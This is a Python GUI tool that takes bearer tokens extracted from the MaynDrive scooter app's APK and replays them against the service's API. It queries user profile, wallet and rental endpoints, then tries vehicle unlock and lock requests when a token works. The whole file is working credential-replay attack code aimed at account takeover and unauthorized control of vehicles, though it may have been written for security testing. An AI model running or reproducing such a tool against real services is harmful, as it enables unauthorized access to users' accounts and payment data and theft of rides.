#!/usr/bin/env python3
"""
MaynDrive Token Tester GUI
User-friendly interface for testing extracted tokens against API endpoints
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import requests
import json
import threading
from pathlib import Path
from datetime import datetime

class TokenTesterGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("MaynDrive Token Tester")
        self.root.geometry("1000x700")
        self.root.configure(bg='#f0f0f0')
        
        # Variables
        self.api_url = tk.StringVar(value="https://api-test.knotcity.io")
        self.scooter_serial = tk.StringVar(value="TEST123")
        self.latitude = tk.StringVar(value="40.7128")
        self.longitude = tk.StringVar(value="-74.0060")
        self.test_results = []
        self.is_testing = False
        
        self.setup_ui()
        self.load_tokens()
    
    def setup_ui(self):
        """Setup the user interface"""
        # Main frame
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Configure grid weights
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        main_frame.columnconfigure(1, weight=1)
        
        # Title
        title_label = ttk.Label(main_frame, text="MaynDrive Token Tester", 
                               font=('Arial', 16, 'bold'))
        title_label.grid(row=0, column=0, columnspan=2, pady=(0, 20))
        
        # Configuration section
        config_frame = ttk.LabelFrame(main_frame, text="Test Configuration", padding="10")
        config_frame.grid(row=1, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0, 10))
        config_frame.columnconfigure(1, weight=1)
        
        # API URL
        ttk.Label(config_frame, text="API Base URL:").grid(row=0, column=0, sticky=tk.W, pady=2)
        api_entry = ttk.Entry(config_frame, textvariable=self.api_url, width=50)
        api_entry.grid(row=0, column=1, sticky=(tk.W, tk.E), padx=(10, 0), pady=2)
        
        # Scooter Serial
        ttk.Label(config_frame, text="Test Scooter Serial:").grid(row=1, column=0, sticky=tk.W, pady=2)
        serial_entry = ttk.Entry(config_frame, textvariable=self.scooter_serial, width=50)
        serial_entry.grid(row=1, column=1, sticky=(tk.W, tk.E), padx=(10, 0), pady=2)
        
        # Location
        location_frame = ttk.Frame(config_frame)
        location_frame.grid(row=2, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=5)
        location_frame.columnconfigure(1, weight=1)
        location_frame.columnconfigure(3, weight=1)
        
        ttk.Label(location_frame, text="Latitude:").grid(row=0, column=0, sticky=tk.W, padx=(0, 5))
        lat_entry = ttk.Entry(location_frame, textvariable=self.latitude, width=15)
        lat_entry.grid(row=0, column=1, sticky=(tk.W, tk.E), padx=(0, 20))
        
        ttk.Label(location_frame, text="Longitude:").grid(row=0, column=2, sticky=tk.W, padx=(0, 5))
        lng_entry = ttk.Entry(location_frame, textvariable=self.longitude, width=15)
        lng_entry.grid(row=0, column=3, sticky=(tk.W, tk.E))
        
        # Control buttons
        button_frame = ttk.Frame(main_frame)
        button_frame.grid(row=2, column=0, columnspan=2, pady=10)
        
        self.start_button = ttk.Button(button_frame, text="Start Testing", 
                                     command=self.start_testing, style='Accent.TButton')
        self.start_button.pack(side=tk.LEFT, padx=(0, 10))
        
        self.stop_button = ttk.Button(button_frame, text="Stop Testing", 
                                    command=self.stop_testing, state='disabled')
        self.stop_button.pack(side=tk.LEFT, padx=(0, 10))
        
        self.save_button = ttk.Button(button_frame, text="Save Results", 
                                    command=self.save_results, state='disabled')
        self.save_button.pack(side=tk.LEFT, padx=(0, 10))
        
        self.load_button = ttk.Button(button_frame, text="Load Tokens", 
                                    command=self.load_tokens)
        self.load_button.pack(side=tk.LEFT)
        
        # Progress bar
        self.progress = ttk.Progressbar(main_frame, mode='determinate')
        self.progress.grid(row=3, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0, 10))
        
        # Status label
        self.status_label = ttk.Label(main_frame, text="Ready to test tokens")
        self.status_label.grid(row=4, column=0, columnspan=2, pady=(0, 10))
        
        # Results section
        results_frame = ttk.LabelFrame(main_frame, text="Test Results", padding="10")
        results_frame.grid(row=5, column=0, columnspan=2, sticky=(tk.W, tk.E, tk.N, tk.S), pady=(0, 10))
        results_frame.columnconfigure(0, weight=1)
        results_frame.rowconfigure(0, weight=1)
        main_frame.rowconfigure(5, weight=1)
        
        # Results text area
        self.results_text = scrolledtext.ScrolledText(results_frame, height=15, width=80)
        self.results_text.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Summary section
        summary_frame = ttk.LabelFrame(main_frame, text="Summary", padding="10")
        summary_frame.grid(row=6, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0, 10))
        summary_frame.columnconfigure(1, weight=1)
        
        ttk.Label(summary_frame, text="Tokens Tested:").grid(row=0, column=0, sticky=tk.W)
        self.tokens_tested_label = ttk.Label(summary_frame, text="0")
        self.tokens_tested_label.grid(row=0, column=1, sticky=tk.W, padx=(10, 0))
        
        ttk.Label(summary_frame, text="Valid Tokens:").grid(row=0, column=2, sticky=tk.W, padx=(20, 0))
        self.valid_tokens_label = ttk.Label(summary_frame, text="0", foreground='green')
        self.valid_tokens_label.grid(row=0, column=3, sticky=tk.W, padx=(10, 0))
        
        ttk.Label(summary_frame, text="Vulnerability:").grid(row=1, column=0, sticky=tk.W)
        self.vulnerability_label = ttk.Label(summary_frame, text="Not Tested", foreground='orange')
        self.vulnerability_label.grid(row=1, column=1, sticky=tk.W, padx=(10, 0))
    
    def load_tokens(self):
        """Load tokens from APK analysis"""
        try:
            apk_report_path = "/home/ubuntu/Desktop/Project/Attacktest/claude_analysis/mobsf_analysis/apk_analysis/apk_analysis_report.json"
            
            if not Path(apk_report_path).exists():
                messagebox.showerror("Error", f"APK analysis report not found at:\n{apk_report_path}")
                return
            
            with open(apk_report_path, 'r') as f:
                data = json.load(f)
            
            tokens = data.get('extracted_secrets', {}).get('bearer_tokens', [])
            
            # Filter for potential JWT tokens and long strings
            self.potential_tokens = []
            for token in tokens:
                if (token.startswith('eyJ') or  # JWT tokens
                    len(token) > 50 or  # Long strings
                    token.startswith('MIIC') or  # Certificate-like
                    'Bearer' in token or  # Bearer tokens
                    (len(token) > 20 and token.replace('-', '').replace('_', '').isalnum())):  # Alphanumeric tokens
                    self.potential_tokens.append(token)
            
            self.log_message(f"✅ Loaded {len(self.potential_tokens)} potential tokens from APK analysis")
            self.status_label.config(text=f"Loaded {len(self.potential_tokens)} tokens ready for testing")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to load tokens:\n{str(e)}")
    
    def log_message(self, message):
        """Add message to results log"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.results_text.insert(tk.END, f"[{timestamp}] {message}\n")
        self.results_text.see(tk.END)
        self.root.update_idletasks()
    
    def test_endpoint(self, token, endpoint, method="GET", payload=None):
        """Test a single endpoint with a token"""
        headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
            "Accept": "application/json",
            "User-Agent": "Knot-mayndrive v1.1.34 (android)"
        }
        
        try:
            if method == "GET":
                response = requests.get(f"{self.api_url.get()}{endpoint}", 
                                     headers=headers, timeout=10)
            elif method == "POST":
                response = requests.post(f"{self.api_url.get()}{endpoint}", 
                                      json=payload, headers=headers, timeout=10)
            else:
                return {"error": f"Unsupported method: {method}"}
            
            return {
                "status_code": response.status_code,
                "success": response.status_code in [200, 201],
                "response_body": response.text[:200] if response.text else "",
                "error": None
            }
            
        except requests.exceptions.Timeout:
            return {"error": "Request timeout", "success": False}
        except requests.exceptions.ConnectionError:
            return {"error": "Connection error", "success": False}
        except Exception as e:
            return {"error": str(e), "success": False}
    
    def test_token_comprehensive(self, token, token_index, total_tokens):
        """Test a token against multiple endpoints"""
        if not self.is_testing:
            return None
        
        self.log_message(f"🔑 Testing Token {token_index}/{total_tokens}: {token[:40]}...")
        
        results = {
            "token": token[:50] + "..." if len(token) > 50 else token,
            "endpoints": {}
        }
        
        # Test authentication endpoints
        auth_endpoints = [
            {"endpoint": "/api/application/users", "method": "GET", "name": "User Profile"},
            {"endpoint": "/api/application/users/wallet", "method": "GET", "name": "User Wallet"},
            {"endpoint": "/api/application/users/rents", "method": "GET", "name": "User Rentals"},
        ]
        
        for ep in auth_endpoints:
            if not self.is_testing:
                return None
                
            result = self.test_endpoint(token, ep["endpoint"], ep["method"])
            results["endpoints"][ep["endpoint"]] = {
                "name": ep["name"],
                "result": result
            }
            
            if result.get("success"):
                self.log_message(f"   ✅ SUCCESS: {ep['name']} - Status: {result['status_code']}")
            else:
                error = result.get('error', result.get('status_code'))
                self.log_message(f"   ❌ FAILED: {ep['name']} - {error}")
        
        # Test vehicle operations if any auth endpoint succeeded
        auth_success = any(ep["result"].get("success") for ep in results["endpoints"].values())
        
        if auth_success and self.is_testing:
            self.log_message("   🚗 Testing vehicle operations...")
            
            vehicle_payload = {
                "serial_number": self.scooter_serial.get(),
                "lat": float(self.latitude.get()),
                "lng": float(self.longitude.get())
            }
            
            vehicle_endpoints = [
                {"endpoint": "/api/application/vehicles/unlock", "method": "POST", "payload": vehicle_payload, "name": "Vehicle Unlock"},
                {"endpoint": "/api/application/vehicles/freefloat/lock", "method": "POST", "payload": vehicle_payload, "name": "Vehicle Lock"},
            ]
            
            for ep in vehicle_endpoints:
                if not self.is_testing:
                    return None
                    
                result = self.test_endpoint(token, ep["endpoint"], ep["method"], ep["payload"])
                results["endpoints"][ep["endpoint"]] = {
                    "name": ep["name"],
                    "result": result
                }
                
                if result.get("success"):
                    self.log_message(f"   🚨 CRITICAL: {ep['name']} - Status: {result['status_code']}")
                else:
                    error = result.get('error', result.get('status_code'))
                    self.log_message(f"   ❌ FAILED: {ep['name']} - {error}")
        
        return results
    
    def start_testing(self):
        """Start the token testing process"""
        if not hasattr(self, 'potential_tokens') or not self.potential_tokens:
            messagebox.showerror("Error", "No tokens loaded. Please load tokens first.")
            return
        
        # Validate configuration
        if not self.api_url.get().strip():
            messagebox.showerror("Error", "Please enter a valid API URL")
            return
        
        try:
            float(self.latitude.get())
            float(self.longitude.get())
        except ValueError:
            messagebox.showerror("Error", "Please enter valid latitude and longitude values")
            return
        
        # Start testing in a separate thread
        self.is_testing = True
        self.start_button.config(state='disabled')
        self.stop_button.config(state='normal')
        self.save_button.config(state='disabled')
        
        # Clear previous results
        self.results_text.delete(1.0, tk.END)
        self.test_results = []
        
        # Start testing thread
        self.testing_thread = threading.Thread(target=self.run_testing)
        self.testing_thread.daemon = True
        self.testing_thread.start()
    
    def run_testing(self):
        """Run the testing process in a separate thread"""
        try:
            tokens_to_test = self.potential_tokens[:20]  # Test first 20 tokens
            total_tokens = len(tokens_to_test)
            
            self.progress.config(maximum=total_tokens)
            
            self.log_message("=" * 60)
            self.log_message("🧪 Starting MaynDrive Token Testing")
            self.log_message("=" * 60)
            self.log_message(f"🎯 Test API: {self.api_url.get()}")
            self.log_message(f"🚗 Test Scooter: {self.scooter_serial.get()}")
            self.log_message(f"📍 Test Location: {self.latitude.get()}, {self.longitude.get()}")
            self.log_message("=" * 60)
            
            valid_tokens = []
            
            for i, token in enumerate(tokens_to_test, 1):
                if not self.is_testing:
                    break
                
                self.progress.config(value=i)
                self.tokens_tested_label.config(text=str(i))
                
                results = self.test_token_comprehensive(token, i, total_tokens)
                
                if results:
                    self.test_results.append(results)
                    
                    # Check if token has any successful endpoints
                    has_success = any(ep["result"].get("success") for ep in results["endpoints"].values())
                    if has_success:
                        valid_tokens.append(results)
                        self.valid_tokens_label.config(text=str(len(valid_tokens)))
            
            # Update final status
            self.root.after(0, self.testing_completed, valid_tokens)
            
        except Exception as e:
            self.root.after(0, lambda: messagebox.showerror("Error", f"Testing failed:\n{str(e)}"))
            self.root.after(0, self.testing_completed, [])
    
    def testing_completed(self, valid_tokens):
        """Called when testing is completed"""
        self.is_testing = False
        self.start_button.config(state='normal')
        self.stop_button.config(state='disabled')
        self.save_button.config(state='normal')
        
        self.log_message("\n" + "=" * 60)
        self.log_message("📊 TESTING COMPLETED")
        self.log_message("=" * 60)
        self.log_message(f"🔍 Tokens Tested: {len(self.test_results)}")
        self.log_message(f"✅ Valid Tokens Found: {len(valid_tokens)}")
        
        if valid_tokens:
            self.log_message("\n🚨 VULNERABILITY CONFIRMED!")
            self.log_message("Valid tokens found that can access the API:")
            self.vulnerability_label.config(text="CONFIRMED", foreground='red')
            
            for i, vt in enumerate(valid_tokens, 1):
                self.log_message(f"\n   Token {i}: {vt['token']}")
                for endpoint, data in vt['endpoints'].items():
                    if data['result'].get('success'):
                        self.log_message(f"      ✅ {data['name']}: Status {data['result']['status_code']}")
        else:
            self.log_message("\n✅ No valid tokens found in test environment")
            self.vulnerability_label.config(text="Not Found", foreground='green')
        
        self.status_label.config(text="Testing completed")
    
    def stop_testing(self):
        """Stop the testing process"""
        self.is_testing = False
        self.log_message("\n⏹️ Testing stopped by user")
        self.status_label.config(text="Testing stopped")
    
    def save_results(self):
        """Save test results to file"""
        if not self.test_results:
            messagebox.showwarning("Warning", "No test results to save")
            return
        
        filename = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")],
            title="Save Test Results"
        )
        
        if filename:
            try:
                results_data = {
                    "test_configuration": {
                        "api_base_url": self.api_url.get(),
                        "test_scooter_serial": self.scooter_serial.get(),
                        "test_location": {"lat": self.latitude.get(), "lng": self.longitude.get()}
                    },
                    "summary": {
                        "total_tokens_tested": len(self.test_results),
                        "valid_tokens_found": len([r for r in self.test_results if any(ep["result"].get("success") for ep in r["endpoints"].values())]),
                        "vulnerability_confirmed": len([r for r in self.test_results if any(ep["result"].get("success") for ep in r["endpoints"].values())]) > 0
                    },
                    "detailed_results": self.test_results
                }
                
                with open(filename, 'w') as f:
                    json.dump(results_data, f, indent=2)
                
                messagebox.showinfo("Success", f"Results saved to:\n{filename}")
                
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save results:\n{str(e)}")

def main():
    """Main function to run the GUI"""
    root = tk.Tk()
    
    # Configure style
    style = ttk.Style()
    style.theme_use('clam')
    
    # Create and run the application
    app = TokenTesterGUI(root)
    
    # Center the window
    root.update_idletasks()
    x = (root.winfo_screenwidth() // 2) - (root.winfo_width() // 2)
    y = (root.winfo_screenheight() // 2) - (root.winfo_height() // 2)
    root.geometry(f"+{x}+{y}")
    
    root.mainloop()

if __name__ == "__main__":
    main()
